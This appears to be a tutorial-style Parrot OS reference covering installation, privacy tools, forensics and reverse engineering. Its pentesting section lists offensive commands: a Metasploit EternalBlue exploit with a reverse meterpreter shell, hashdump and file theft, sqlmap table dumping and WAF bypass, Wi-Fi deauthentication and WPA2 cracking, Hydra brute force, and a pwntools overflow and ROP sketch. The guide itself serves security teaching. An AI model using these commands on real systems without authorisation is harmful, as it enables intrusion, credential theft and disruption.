---
seoTitle: Parrot OS Complete Guide – Privacy, Security & Forensics Linux
description: "Comprehensive Parrot OS reference covering installation, AnonSurf, privacy tools, pentesting tools, digital forensics, reverse engineering, and daily use with Parrot Home edition."
keywords: "Parrot OS, Parrot Security, parrot linux, parrot os guide, parrot os tutorial, anonsurf, parrot privacy, parrot pentesting, parrot forensics, parrot vs kali, debian security linux, ethical hacking linux, VR-Rathod, Code-Note, code note vr, vr book"
displayTitle: Parrot OS – Complete Guide
enableToc: true
treeTitle: OS - Linux Distros - Parrot OS
---

- # History
  collapsed:: true
	- ## Origins — Italy, 2013
		- **Parrot OS** (officially *Parrot Security*) was born in **2013** in **Frosinone, Italy**.
		- Created by **Lorenzo "Palinuro" Farina** and the **Frozenbox** development team.
		- The Frozenbox team was a group of Italian security researchers, developers, and privacy advocates who wanted a Linux distribution that combined security tooling with genuine privacy features.
		- The name "Parrot" reflects the project's colorful, creative identity — a parrot is clever, adaptable, and communicates freely. The mascot is a stylized parrot, and the project embraces a vibrant, artistic aesthetic.
	- ## Why Parrot Was Created
		- In 2013, [[Kali Linux]] (then BackTrack) was the dominant security distro — but it was heavy, resource-intensive, and focused almost entirely on offensive security tools.
		- The Frozenbox team wanted something different:
			- **Lighter** — runs well on older hardware and low-RAM machines
			- **Privacy-first** — built-in Tor routing, metadata cleaning, sandboxing
			- **Daily driver capable** — not just a pentesting live USB, but a usable desktop OS
			- **Forensics-ready** — digital forensics tools alongside security tools
			- **Developer-friendly** — programming tools, IDEs, and dev environments included
	- ## Technical Foundation
		- Built on **[[Debian]]** (Testing/Stable branch) — inherits Debian's stability and massive package ecosystem.
		- Uses **APT** package manager — same as Debian and [[Ubuntu]].
		- Desktop environment: **MATE** (default) — lightweight, fast, customizable.
		- Kernel: Debian-based with security patches and custom configurations.
	- ## Timeline
		- ```
		  2013        → Parrot OS 0.x — initial release by Frozenbox team
		  2014-2016   → Rapid development; security + privacy tools added
		  2017        → Parrot 3.x — major maturity milestone
		  2019        → Parrot 4.x — improved AnonSurf, new tools
		  2020        → Parrot 4.10 — Parrot Home edition introduced
		  2021        → Parrot 5.0 — based on Debian 11 Bullseye
		  2022        → Parrot 5.1/5.2 — stability improvements
		  2023        → Parrot 5.3 — Debian 12 Bookworm base
		  2024        → Parrot 6.x — continued development
		  ```
	- ## Community & Governance
		- Parrot OS is maintained by the **Parrot Project** — a community-driven, non-profit initiative.
		- Hosted at: `https://parrotsec.org`
		- Community: Telegram groups, Discord, forums, and GitLab.
		- Funded by community donations and partnerships.
- # Introduction
  collapsed:: true
	- ## What is Parrot OS?
		- Parrot OS is a **Debian-based, security-focused Linux distribution** designed for **penetration testing, digital forensics, privacy, and daily use**.
		- It ships with hundreds of pre-installed security tools, privacy utilities, and development environments — all in a lightweight, polished package.
		- Unlike [[Kali Linux]] (which is purely offensive security), Parrot is designed to be a **complete operating system** — you can use it as your daily driver while having all security tools at your fingertips.
		- Key differentiators: **AnonSurf** (system-wide Tor routing), **Firejail** sandboxing, **MAT2** metadata cleaner, and a focus on **operational security (OPSEC)**.
	- ## Parrot OS Editions
		- ```mermaid
		  graph TD
		      A[🦜 Parrot OS] --> B[Security Edition]
		      A --> C[Home Edition]
		      A --> D[HTB Edition]
		      A --> E[Architect Edition]
		      A --> F[Cloud Edition]
		  
		      B --> B1[Full pentesting + forensics tools\nMATE desktop\nAnonSurf included\nBest for: security professionals]
		      C --> C1[No security tools\nPrivacy tools only\nLighter, daily driver\nBest for: privacy-conscious users]
		      D --> D1[Hack The Box optimized\nHTB tools pre-configured\nBest for: CTF players]
		      E --> E1[Minimal base install\nNo desktop environment\nBest for: custom builds]
		      F --> F1[Cloud/server image\nAWS, Azure, GCP\nBest for: cloud pentesting]
		  ```
	- ## Parrot OS vs Kali Linux
		- | Feature | Parrot OS | [[Kali Linux]] |
		  |---------|-----------|------------|
		  | Base | Debian Testing/Stable | Debian Testing |
		  | Desktop | MATE (default) | GNOME (default) |
		  | RAM usage (idle) | ~300-400 MB | ~500-700 MB |
		  | Minimum RAM | 512 MB (1 GB recommended) | 2 GB recommended |
		  | Privacy tools | AnonSurf, Firejail, MAT2 | Limited |
		  | Daily driver | Yes (Home edition) | Not recommended |
		  | Security tools | 600+ tools | 600+ tools |
		  | Forensics mode | Yes (no disk writes) | Yes |
		  | Update model | Rolling (Debian Testing) | Rolling |
		  | Target user | Privacy + security + daily use | Pure pentesting |
		  | Live USB | Yes | Yes |
		  | ARM support | Yes | Yes |
		  | Community | Smaller, tight-knit | Larger, more resources |
	- ## Advantages
		- **Lightweight** — runs on machines with as little as 512 MB RAM.
		- **Privacy-first** — AnonSurf, Firejail, MAT2, and Tor Browser built in.
		- **Daily driver capable** — Home edition is a polished, privacy-focused desktop OS.
		- **Full security toolkit** — Metasploit, Nmap, Burp Suite, Wireshark, and 600+ more tools.
		- **Forensics mode** — live boot without touching the disk.
		- **Debian stability** — inherits Debian's rock-solid package management.
		- **Beautiful UI** — MATE desktop with custom Parrot themes, icons, and wallpapers.
		- **Active development** — regular updates and a passionate community.
	- ## Disadvantages
		- **Smaller community** than Kali — fewer tutorials and Stack Overflow answers.
		- **Rolling release** — occasional package breakage (Debian Testing base).
		- **Less corporate backing** — Kali has Offensive Security behind it.
		- **Tool documentation** — some tools have less documentation than Kali equivalents.
		- **Not RHEL-compatible** — APT/Debian ecosystem only.
	- ## Use Cases
		- Penetration testing and ethical hacking, digital forensics and incident response, privacy-conscious daily computing, CTF (Capture The Flag) competitions, malware analysis and reverse engineering, OSINT (Open Source Intelligence), security research, anonymous browsing and communication, developer workstation with security tools.
- # Installation
  collapsed:: true
	- ## System Requirements
		- ```
		  Parrot Security (Minimum):
		    CPU:   1 GHz dual-core (64-bit x86_64 or ARM)
		    RAM:   512 MB (1 GB recommended, 2 GB for comfortable use)
		    Disk:  16 GB (40 GB recommended for full install)
		    GPU:   Any (MATE is lightweight)
		  
		  Parrot Home (Minimum):
		    CPU:   1 GHz
		    RAM:   512 MB (1 GB recommended)
		    Disk:  16 GB
		  
		  Recommended for pentesting work:
		    CPU:   2+ cores
		    RAM:   4-8 GB
		    Disk:  60 GB+ SSD
		  ```
	- ## Download ISO
		- Download from: `https://parrotsec.org/download/`
		- Available editions: Security, Home, HTB, Architect
		- Verify integrity:
		- ```bash
		  # Verify SHA256 checksum
		  sha256sum Parrot-security-6.x_amd64.iso
		  # Compare with the checksum on the download page
		  
		  # Verify GPG signature
		  gpg --keyserver keyserver.ubuntu.com --recv-keys 3B3EAB807D70721BA9C03E55C7B39D0167C3C5A7
		  gpg --verify Parrot-security-6.x_amd64.iso.sig Parrot-security-6.x_amd64.iso
		  ```
	- ## Creating Bootable USB
		- ```bash
		  # Linux — dd method
		  sudo dd if=Parrot-security-6.x_amd64.iso of=/dev/sdX bs=4M status=progress oflag=sync
		  
		  # Linux — using Etcher (GUI)
		  # Download balenaEtcher from https://etcher.balena.io
		  
		  # Windows — Rufus or balenaEtcher
		  # macOS
		  sudo dd if=Parrot-security-6.x_amd64.iso of=/dev/rdiskX bs=4m
		  ```
	- ## Calamares Installer Steps
		- Parrot OS uses the **Calamares** installer — a modern, user-friendly graphical installer.
		- ```
		  1. Boot from USB → select "Try/Install Parrot OS"
		  2. Launch installer from desktop (Install Parrot icon)
		  3. Language selection
		  4. Location / Timezone
		  5. Keyboard layout
		  6. Partitioning:
		     - Erase disk (automatic) — simplest option
		     - Manual partitioning:
		       /boot/efi  → 512 MB  (FAT32, UEFI)
		       /          → 30+ GB  (ext4 or btrfs)
		       swap       → 2-4 GB  (or use zram)
		       /home      → rest    (ext4)
		  7. User creation → set username + strong password
		  8. Summary → review and Install
		  9. ~15-20 minutes → Reboot
		  ```
		- > [!tip] For forensics work, consider a separate `/home` partition so you can reinstall the OS without losing case data.
	- ## First Boot & Updates
		- ```bash
		  # Update system immediately
		  sudo apt update && sudo apt full-upgrade -y
		  
		  # Install any missing firmware
		  sudo apt install firmware-linux firmware-linux-nonfree -y
		  
		  # Update Parrot-specific tools
		  sudo parrot-upgrade
		  
		  # Check AnonSurf is available
		  anonsurf status
		  
		  # Enable automatic security updates
		  sudo apt install unattended-upgrades -y
		  sudo dpkg-reconfigure unattended-upgrades
		  
		  # Install additional tools
		  sudo apt install vim tmux htop neofetch -y
		  ```
- # Kernel & Architecture
  collapsed:: true
	- ## Debian-Based Kernel
		- Parrot OS uses the **Debian kernel** with additional security patches and configurations.
		- ```bash
		  uname -r                    # current kernel version
		  uname -a                    # full system info
		  cat /proc/version           # kernel version details
		  dpkg -l | grep linux-image  # installed kernel packages
		  
		  # Parrot ships with:
		  # - Hardened kernel options
		  # - AppArmor enabled (Debian's MAC system)
		  # - Kernel lockdown features
		  ```
	- ## Boot Process
		- ```
		  Power On
		    → UEFI/BIOS POST
		    → GRUB2 bootloader
		    → Kernel (vmlinuz) + initrd
		    → systemd (PID 1)
		    → Basic system initialization
		    → Network, logging, udev
		    → Display Manager (LightDM)
		    → MATE Desktop Environment
		    → Login screen
		  ```
		- ```bash
		  # GRUB2 management
		  sudo update-grub              # regenerate GRUB config
		  cat /boot/grub/grub.cfg       # view GRUB config
		  sudo vim /etc/default/grub    # edit GRUB defaults
		  
		  # Boot options
		  # "Parrot GNU/Linux"          → normal boot
		  # "Parrot Forensic Mode"      → live boot, no disk writes
		  # "Recovery Mode"             → single-user recovery
		  ```
	- ## AppArmor (Parrot's MAC System)
		- Parrot uses **AppArmor** (not SELinux) — Debian's default mandatory access control system.
		- ```bash
		  # Check AppArmor status
		  sudo apparmor_status
		  sudo aa-status
		  
		  # List profiles
		  sudo aa-status | grep "profiles are loaded"
		  
		  # Set profile to complain mode (log but don't block)
		  sudo aa-complain /usr/bin/firefox
		  
		  # Set profile to enforce mode
		  sudo aa-enforce /usr/bin/firefox
		  
		  # Disable a profile
		  sudo aa-disable /usr/bin/firefox
		  ```
	- ## Linux File System Hierarchy on Parrot
		- ```
		  /           Root filesystem (ext4 default)
		  ├── /bin    → /usr/bin (merged-usr)
		  ├── /boot   GRUB2, kernel, initrd
		  ├── /dev    Device files
		  ├── /etc    Configuration files
		  ├── /home   User home directories
		  ├── /lib    → /usr/lib
		  ├── /media  Removable media mount points
		  ├── /mnt    Manual mount points
		  ├── /opt    Third-party software
		  ├── /proc   Process/kernel virtual FS
		  ├── /root   Root user home
		  ├── /run    Runtime data (tmpfs)
		  ├── /sbin   → /usr/sbin
		  ├── /srv    Service data
		  ├── /sys    Hardware/driver virtual FS
		  ├── /tmp    Temporary files
		  ├── /usr    Programs, libraries, docs
		  └── /var    Logs, spool, cache
		  ```
- # APT Package Management
  collapsed:: true
	- ## APT Essentials
		- ```bash
		  # ── UPDATE & UPGRADE ────────────────────────────────────
		  sudo apt update                     # refresh package lists
		  sudo apt upgrade -y                 # upgrade installed packages
		  sudo apt full-upgrade -y            # upgrade + handle dependency changes
		  sudo apt dist-upgrade -y            # alias for full-upgrade
		  sudo parrot-upgrade                 # Parrot-specific upgrade script
		  
		  # ── INSTALL & REMOVE ────────────────────────────────────
		  sudo apt install nmap               # install package
		  sudo apt install nmap=7.93          # install specific version
		  sudo apt install ./local.deb        # install local .deb file
		  sudo apt remove nmap                # remove (keep config)
		  sudo apt purge nmap                 # remove + config files
		  sudo apt autoremove                 # remove unused dependencies
		  sudo apt autoclean                  # clean old cached packages
		  
		  # ── SEARCH & INFO ────────────────────────────────────────
		  apt search metasploit               # search packages
		  apt show metasploit-framework       # package details
		  apt list --installed                # all installed packages
		  apt list --upgradable               # packages with updates
		  dpkg -l                             # list all installed (dpkg)
		  dpkg -l | grep nmap                 # search installed
		  dpkg -L nmap                        # files installed by package
		  dpkg -S /usr/bin/nmap               # which package owns file
		  
		  # ── CACHE ────────────────────────────────────────────────
		  sudo apt clean                      # remove all cached packages
		  sudo apt autoclean                  # remove outdated cached packages
		  du -sh /var/cache/apt/archives/     # cache size
		  ```
	- ## Parrot Repositories
		- ```bash
		  # View current repos
		  cat /etc/apt/sources.list
		  ls /etc/apt/sources.list.d/
		  
		  # Parrot repos (example)
		  ```
		- ```ini
		  # /etc/apt/sources.list.d/parrot.list
		  deb https://deb.parrot.sh/parrot/ parrot main contrib non-free non-free-firmware
		  # deb-src https://deb.parrot.sh/parrot/ parrot main contrib non-free non-free-firmware
		  ```
		- ```bash
		  # Add a third-party repo (example: Signal)
		  wget -O- https://updates.signal.org/desktop/apt/keys.asc | \
		      gpg --dearmor | sudo tee /usr/share/keyrings/signal-desktop-keyring.gpg > /dev/null
		  echo "deb [arch=amd64 signed-by=/usr/share/keyrings/signal-desktop-keyring.gpg] \
		      https://updates.signal.org/desktop/apt xenial main" | \
		      sudo tee /etc/apt/sources.list.d/signal-xenial.list
		  sudo apt update && sudo apt install signal-desktop
		  ```
	- ## dpkg Commands
		- ```bash
		  sudo dpkg -i package.deb            # install .deb file
		  sudo dpkg -r package                # remove package
		  sudo dpkg -P package                # purge package
		  dpkg -l package                     # package status
		  dpkg -L package                     # list installed files
		  dpkg -S /path/to/file               # find owning package
		  dpkg --get-selections               # all installed packages
		  sudo dpkg --configure -a            # fix broken installs
		  sudo apt install -f                 # fix broken dependencies
		  ```
- # Privacy Tools
  collapsed:: true
	- ## AnonSurf — System-Wide Tor Routing
		- **AnonSurf** is Parrot's flagship privacy tool — it routes **all system traffic through the Tor network** using iptables rules.
		- See the dedicated [[#AnonSurf Deep Dive]] section for full details.
		- ```bash
		  anonsurf start          # start anonymous mode
		  anonsurf stop           # stop and restore normal networking
		  anonsurf status         # check if active
		  anonsurf myip           # show your current Tor exit IP
		  anonsurf change         # get a new Tor circuit (new IP)
		  ```
	- ## Tor Browser
		- ```bash
		  # Tor Browser is pre-installed on Parrot Security
		  # Launch from Applications → Internet → Tor Browser
		  
		  # Or from terminal
		  tor-browser
		  
		  # Update Tor Browser
		  sudo apt update && sudo apt install torbrowser-launcher -y
		  torbrowser-launcher    # downloads and launches latest version
		  
		  # Tor Browser security levels:
		  # Standard    → all features enabled
		  # Safer       → JS disabled on non-HTTPS sites
		  # Safest      → JS disabled everywhere, no media
		  ```
		- > [!tip] Use Tor Browser's "Safest" security level for maximum anonymity. Never resize the browser window (fingerprinting risk) and never log into personal accounts.
	- ## OnionShare — Anonymous File Sharing
		- ```bash
		  # Install OnionShare
		  sudo apt install onionshare -y
		  
		  # Launch GUI
		  onionshare
		  
		  # CLI usage
		  onionshare-cli /path/to/file    # share a file via .onion address
		  onionshare-cli --receive        # receive files anonymously
		  onionshare-cli --website /path/ # host a website anonymously
		  ```
		- > [!info] OnionShare creates a temporary .onion address to share files — the recipient only needs Tor Browser. No accounts, no servers, no metadata.
	- ## Firejail — Application Sandboxing
		- **Firejail** runs applications in isolated sandboxes, limiting what they can access.
		- ```bash
		  # Install (usually pre-installed)
		  sudo apt install firejail -y
		  
		  # Run application in sandbox
		  firejail firefox                    # sandbox Firefox
		  firejail --private chromium         # private home directory
		  firejail --net=none curl example.com  # no network access
		  
		  # List running sandboxes
		  firejail --list
		  
		  # Join an existing sandbox
		  firejail --join=PID
		  
		  # Firejail profiles (pre-configured for common apps)
		  ls /etc/firejail/
		  # firefox.profile, chromium.profile, vlc.profile, etc.
		  
		  # Create custom profile
		  cp /etc/firejail/firefox.profile ~/.config/firejail/myapp.profile
		  vim ~/.config/firejail/myapp.profile
		  ```
	- ## MAT2 — Metadata Cleaner
		- **MAT2** (Metadata Anonymisation Toolkit) removes metadata from files before sharing.
		- ```bash
		  # Install
		  sudo apt install mat2 -y
		  
		  # Clean metadata from a file
		  mat2 document.pdf               # clean PDF
		  mat2 photo.jpg                  # clean JPEG (removes GPS, camera info)
		  mat2 document.docx              # clean Word document
		  mat2 audio.mp3                  # clean MP3
		  
		  # Check metadata without cleaning
		  mat2 --show photo.jpg
		  
		  # Clean all files in a directory
		  mat2 *.jpg
		  mat2 /path/to/files/*
		  
		  # Lightweight mode (faster, less thorough)
		  mat2 --lightweight photo.jpg
		  ```
		- > [!warning] Always clean metadata from files before sharing them publicly. Photos contain GPS coordinates, device info, and timestamps that can reveal your identity and location.
	- ## KeePassXC — Password Manager
		- ```bash
		  sudo apt install keepassxc -y
		  keepassxc    # launch GUI
		  
		  # KeePassXC features:
		  # - Local encrypted password database (.kdbx)
		  # - Browser integration (Firefox, Chromium)
		  # - TOTP (2FA) support
		  # - SSH agent integration
		  # - Auto-type for login forms
		  # - No cloud sync (privacy-preserving)
		  ```
	- ## VeraCrypt — Disk Encryption
		- ```bash
		  sudo apt install veracrypt -y
		  veracrypt    # launch GUI
		  
		  # CLI usage
		  # Create encrypted container
		  veracrypt --text --create /path/to/container \
		      --size 1G --password "strongpassword" \
		      --volume-type normal --encryption AES \
		      --hash SHA-512 --filesystem ext4 --pim 0 -k ""
		  
		  # Mount container
		  veracrypt --text --mount /path/to/container /mnt/secure \
		      --password "strongpassword" --pim 0 -k ""
		  
		  # Unmount
		  veracrypt --text --dismount /mnt/secure
		  ```
	- ## I2P — Invisible Internet Project
		- ```bash
		  # Install I2P
		  sudo apt install i2p -y
		  
		  # Start I2P router
		  i2prouter start
		  
		  # Access I2P console at: http://127.0.0.1:7657
		  # Configure browser proxy: 127.0.0.1:4444 (HTTP)
		  #                          127.0.0.1:4447 (SOCKS)
		  
		  # Stop I2P
		  i2prouter stop
		  ```
- # Security & Pentesting Tools
  collapsed:: true
	- ## Metasploit Framework
		- ```bash
		  # Start Metasploit
		  sudo msfdb init          # initialize database (first time)
		  msfconsole               # launch Metasploit console
		  
		  # Basic workflow inside msfconsole:
		  ```
		- ```bash
		  # Search for exploits
		  msf6 > search type:exploit platform:windows smb
		  msf6 > search cve:2017-0144    # EternalBlue
		  
		  # Use an exploit
		  msf6 > use exploit/windows/smb/ms17_010_eternalblue
		  msf6 exploit > show options
		  msf6 exploit > set RHOSTS 192.168.1.100
		  msf6 exploit > set LHOST 192.168.1.50
		  msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
		  msf6 exploit > run
		  
		  # Meterpreter session
		  meterpreter > sysinfo
		  meterpreter > getuid
		  meterpreter > hashdump
		  meterpreter > shell
		  meterpreter > upload /path/to/file C:\\Windows\\Temp\\
		  meterpreter > download C:\\sensitive.txt /tmp/
		  ```
		- > [!warning] Only use Metasploit on systems you own or have explicit written permission to test. Unauthorized use is illegal.
	- ## Nmap — Network Scanner
		- ```bash
		  # Basic scans
		  nmap 192.168.1.1                    # basic scan
		  nmap 192.168.1.0/24                 # scan entire subnet
		  nmap -sV 192.168.1.1                # version detection
		  nmap -O 192.168.1.1                 # OS detection
		  nmap -A 192.168.1.1                 # aggressive (OS+version+scripts)
		  nmap -p 80,443,22 192.168.1.1       # specific ports
		  nmap -p- 192.168.1.1                # all 65535 ports
		  nmap -sU 192.168.1.1                # UDP scan
		  nmap -sS 192.168.1.1                # SYN stealth scan (root)
		  
		  # NSE Scripts
		  nmap --script vuln 192.168.1.1      # vulnerability scan
		  nmap --script http-enum 192.168.1.1 # web enumeration
		  nmap --script smb-vuln* 192.168.1.1 # SMB vulnerabilities
		  nmap --script ssl-heartbleed 192.168.1.1  # Heartbleed check
		  
		  # Output formats
		  nmap -oN output.txt 192.168.1.1     # normal text
		  nmap -oX output.xml 192.168.1.1     # XML
		  nmap -oG output.gnmap 192.168.1.1   # grepable
		  nmap -oA output 192.168.1.1         # all formats
		  ```
	- ## Wireshark — Packet Analysis
		- ```bash
		  # Launch GUI
		  wireshark
		  
		  # CLI with tshark
		  tshark -i eth0                      # capture on interface
		  tshark -i eth0 -w capture.pcap      # save to file
		  tshark -r capture.pcap              # read pcap file
		  tshark -r capture.pcap -Y "http"    # filter HTTP
		  tshark -r capture.pcap -Y "tcp.port == 443"
		  
		  # Useful Wireshark display filters
		  # http                              → all HTTP traffic
		  # http.request.method == "POST"     → POST requests
		  # ip.addr == 192.168.1.100          → specific IP
		  # tcp.port == 22                    → SSH traffic
		  # dns                               → DNS queries
		  # !(arp or dns or icmp)             → exclude noise
		  ```
	- ## Burp Suite — Web App Testing
		- ```bash
		  # Launch Burp Suite Community Edition
		  burpsuite
		  
		  # Key features:
		  # Proxy     → intercept browser traffic
		  # Scanner   → automated vulnerability scanning (Pro)
		  # Intruder  → automated attack tool
		  # Repeater  → manually replay/modify requests
		  # Decoder   → encode/decode data (Base64, URL, etc.)
		  # Comparer  → diff two requests/responses
		  
		  # Setup: Configure browser proxy → 127.0.0.1:8080
		  # Install Burp CA certificate in browser for HTTPS interception
		  ```
	- ## SQLMap — SQL Injection
		- ```bash
		  # Basic SQL injection test
		  sqlmap -u "http://target.com/page?id=1"
		  
		  # With POST data
		  sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
		  
		  # Enumerate databases
		  sqlmap -u "http://target.com/page?id=1" --dbs
		  
		  # Enumerate tables
		  sqlmap -u "http://target.com/page?id=1" -D dbname --tables
		  
		  # Dump table data
		  sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
		  
		  # Use cookies (authenticated)
		  sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
		  
		  # Bypass WAF
		  sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
		  ```
	- ## Aircrack-ng — Wireless Security
		- ```bash
		  # Put interface in monitor mode
		  sudo airmon-ng start wlan0          # creates wlan0mon
		  
		  # Scan for networks
		  sudo airodump-ng wlan0mon
		  
		  # Capture handshake for specific network
		  sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
		  
		  # Deauth attack (force handshake)
		  sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
		  
		  # Crack WPA2 handshake
		  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
		  
		  # Stop monitor mode
		  sudo airmon-ng stop wlan0mon
		  ```
	- ## John the Ripper & Hashcat
		- ```bash
		  # John the Ripper
		  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
		  john --format=md5 hashes.txt
		  john --show hashes.txt              # show cracked passwords
		  john --list=formats                 # supported hash formats
		  
		  # Hashcat (GPU-accelerated)
		  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
		  hashcat -m 1000 hashes.txt wordlist.txt                      # NTLM
		  hashcat -m 1800 hashes.txt wordlist.txt                      # SHA-512crypt
		  hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a                   # brute force 6 chars
		  hashcat --show hashes.txt           # show cracked
		  ```
	- ## Hydra — Network Login Brute Force
		- ```bash
		  # SSH brute force
		  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
		  
		  # HTTP form brute force
		  hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form \
		      "/login:username=^USER^&password=^PASS^:Invalid credentials"
		  
		  # FTP brute force
		  hydra -L users.txt -P passwords.txt ftp://192.168.1.100
		  
		  # Multiple targets
		  hydra -L users.txt -P passwords.txt -M targets.txt ssh
		  ```
	- ## Social Engineering Toolkit (SET)
		- ```bash
		  # Launch SET
		  sudo setoolkit
		  
		  # Main menu options:
		  # 1) Social-Engineering Attacks
		  #    → Spear-Phishing, Website Attack Vectors, Infectious Media
		  # 2) Penetration Testing (Fast-Track)
		  # 3) Third Party Modules
		  ```
	- ## theHarvester — OSINT
		- ```bash
		  # Gather emails, subdomains, IPs for a domain
		  theHarvester -d example.com -b google
		  theHarvester -d example.com -b all    # all sources
		  theHarvester -d example.com -b linkedin,google,bing
		  
		  # Sources: google, bing, linkedin, twitter, shodan, etc.
		  ```
- # Digital Forensics Tools
  collapsed:: true
	- ## Forensics Mode
		- Parrot OS has a dedicated **Forensics Mode** in the boot menu — it boots without mounting any local disks, preventing accidental evidence contamination.
		- ```
		  Boot menu → "Parrot Forensic Mode"
		  → No auto-mount of local drives
		  → No swap activation
		  → No modification of local filesystems
		  → Safe for evidence acquisition
		  ```
	- ## Autopsy — Digital Forensics Platform
		- ```bash
		  # Launch Autopsy
		  autopsy
		  
		  # Autopsy is a GUI forensics platform built on The Sleuth Kit
		  # Features:
		  # - Disk image analysis
		  # - File system browsing
		  # - Keyword search
		  # - Timeline analysis
		  # - Hash filtering (known good/bad files)
		  # - Email analysis
		  # - Web artifact extraction
		  # - Registry analysis (Windows)
		  ```
	- ## The Sleuth Kit (TSK)
		- ```bash
		  # Disk image tools
		  mmls disk.img                   # partition layout
		  fsstat -o 2048 disk.img         # filesystem stats
		  fls -r -o 2048 disk.img         # list files recursively
		  icat -o 2048 disk.img 12345     # extract file by inode
		  
		  # File system analysis
		  blkls -o 2048 disk.img          # unallocated blocks
		  dls -o 2048 disk.img            # deleted file data
		  ils -o 2048 disk.img            # inode list
		  
		  # Create disk image
		  sudo dd if=/dev/sdb of=evidence.img bs=4M status=progress
		  # Or with dcfldd (better for forensics)
		  sudo dcfldd if=/dev/sdb of=evidence.img hash=sha256 hashlog=hash.txt
		  ```
	- ## Volatility — Memory Forensics
		- ```bash
		  # Volatility 3 (pre-installed on Parrot)
		  # Analyze memory dump
		  vol -f memory.dmp windows.info          # OS info
		  vol -f memory.dmp windows.pslist        # process list
		  vol -f memory.dmp windows.pstree        # process tree
		  vol -f memory.dmp windows.netstat       # network connections
		  vol -f memory.dmp windows.cmdline       # command line args
		  vol -f memory.dmp windows.filescan      # file handles
		  vol -f memory.dmp windows.dumpfiles --pid 1234  # dump process files
		  vol -f memory.dmp windows.hashdump      # password hashes
		  
		  # Linux memory analysis
		  vol -f linux.dmp linux.pslist
		  vol -f linux.dmp linux.bash             # bash history from memory
		  ```
	- ## Foremost & Scalpel — File Carving
		- ```bash
		  # Foremost — recover deleted files by file signature
		  sudo foremost -i disk.img -o /output/dir/
		  sudo foremost -t jpg,pdf,doc -i disk.img -o /output/
		  
		  # Scalpel — faster, more configurable file carver
		  sudo scalpel disk.img -o /output/dir/
		  # Configure file types in /etc/scalpel/scalpel.conf
		  ```
	- ## Binwalk — Firmware Analysis
		- ```bash
		  # Analyze firmware/binary
		  binwalk firmware.bin                    # scan for embedded files
		  binwalk -e firmware.bin                 # extract embedded files
		  binwalk -M firmware.bin                 # recursive extraction
		  binwalk --dd='.*' firmware.bin          # extract everything
		  
		  # Entropy analysis (detect encryption/compression)
		  binwalk -E firmware.bin
		  ```
	- ## ExifTool — Metadata Analysis
		- ```bash
		  # Read all metadata
		  exiftool photo.jpg
		  exiftool document.pdf
		  
		  # Read specific tags
		  exiftool -GPS* photo.jpg              # GPS data only
		  exiftool -Author -CreateDate doc.pdf  # specific fields
		  
		  # Remove all metadata
		  exiftool -all= photo.jpg              # in-place
		  exiftool -all= -o clean.jpg photo.jpg # to new file
		  
		  # Batch process
		  exiftool -all= *.jpg                  # clean all JPEGs
		  exiftool -r -all= /path/to/photos/    # recursive
		  ```
- # Reverse Engineering
  collapsed:: true
	- ## Ghidra — NSA's Reverse Engineering Suite
		- ```bash
		  # Launch Ghidra
		  ghidra
		  
		  # Ghidra features:
		  # - Disassembler + decompiler (C-like pseudocode)
		  # - Multi-architecture: x86, ARM, MIPS, PowerPC, etc.
		  # - Scripting (Java + Python)
		  # - Collaborative analysis
		  # - Binary diffing
		  # - Symbol/function analysis
		  
		  # Workflow:
		  # 1. Create new project
		  # 2. Import binary (File → Import File)
		  # 3. Auto-analyze (yes to all)
		  # 4. Browse functions in Symbol Tree
		  # 5. Use Decompiler window for C pseudocode
		  ```
	- ## Radare2 — Command-Line RE Framework
		- ```bash
		  # Open binary
		  r2 binary                       # open for analysis
		  r2 -d binary                    # open with debugger
		  r2 -A binary                    # open + auto-analyze
		  
		  # Inside r2:
		  # aa          → analyze all
		  # aaa         → deeper analysis
		  # afl         → list all functions
		  # pdf @ main  → disassemble main function
		  # s main      → seek to main
		  # VV          → visual graph mode
		  # q           → quit
		  
		  # Cutter — Ghidra-like GUI for Radare2
		  cutter binary
		  ```
	- ## GDB with pwndbg
		- ```bash
		  # Install pwndbg (enhances GDB)
		  sudo apt install gdb -y
		  git clone https://github.com/pwndbg/pwndbg
		  cd pwndbg && ./setup.sh
		  
		  # Launch GDB
		  gdb ./binary
		  
		  # GDB + pwndbg commands:
		  # run                → run the program
		  # break main         → set breakpoint at main
		  # break *0x401234    → breakpoint at address
		  # continue           → continue execution
		  # next               → next line (step over)
		  # step               → step into function
		  # info registers     → show all registers
		  # x/20x $rsp         → examine stack (20 hex words)
		  # disassemble main   → disassemble function
		  # backtrace          → call stack
		  # vmmap              → memory map (pwndbg)
		  # checksec           → binary security features (pwndbg)
		  ```
	- ## pwntools — CTF Exploit Framework
		- ```bash
		  # Install
		  pip3 install pwntools
		  
		  # Basic exploit script
		  ```
		- ```python
		  from pwn import *
		  
		  # Connect to local binary
		  p = process('./vulnerable_binary')
		  
		  # Connect to remote
		  p = remote('ctf.example.com', 1337)
		  
		  # Send payload
		  payload = b'A' * 64 + p64(0xdeadbeef)  # overflow + address
		  p.sendline(payload)
		  
		  # Receive output
		  print(p.recvall().decode())
		  
		  # Shellcode
		  context.arch = 'amd64'
		  shellcode = asm(shellcraft.sh())
		  
		  # ROP chains
		  elf = ELF('./binary')
		  rop = ROP(elf)
		  rop.call('system', [next(elf.search(b'/bin/sh'))])
		  ```
	- ## ltrace & strace — System Call Tracing
		- ```bash
		  # strace — trace system calls
		  strace ./binary                     # trace all syscalls
		  strace -e trace=open,read ./binary  # specific syscalls
		  strace -p PID                       # attach to running process
		  strace -o output.txt ./binary       # save to file
		  
		  # ltrace — trace library calls
		  ltrace ./binary                     # trace library calls
		  ltrace -e strcmp ./binary           # specific function
		  ltrace -p PID                       # attach to process
		  
		  # Useful for:
		  # - Understanding what a binary does without source
		  # - Finding hardcoded passwords (strcmp calls)
		  # - Identifying file/network operations
		  # - Malware analysis (safe environment only!)
		  ```
- # Networking & Wireless
  collapsed:: true
